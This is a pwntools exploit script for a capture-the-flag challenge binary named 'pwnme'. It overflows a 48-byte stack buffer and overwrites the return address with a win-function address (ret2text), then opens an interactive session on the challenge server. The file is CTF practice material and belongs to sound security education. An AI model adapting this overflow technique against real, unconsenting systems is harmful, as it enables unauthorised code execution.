'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    exp: ret2text
'''

from pwn import *


local = 0
url, port = "0.cloud.chals.io", 13545
filename = "./pwnme"
elf = ELF(filename)
# libc = ELF("./libc.so.6") 
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    context.log_level = "debug"
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

win_addr = 0x000000000040119E # 0x0000000000401196 stack unaligned
buffer_length = 48

def pwn():
    # B()
    payload = cyclic(buffer_length + 8) + p64(win_addr)
    io.sendlineafter(b'Welcome to PWN 101\n\n', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
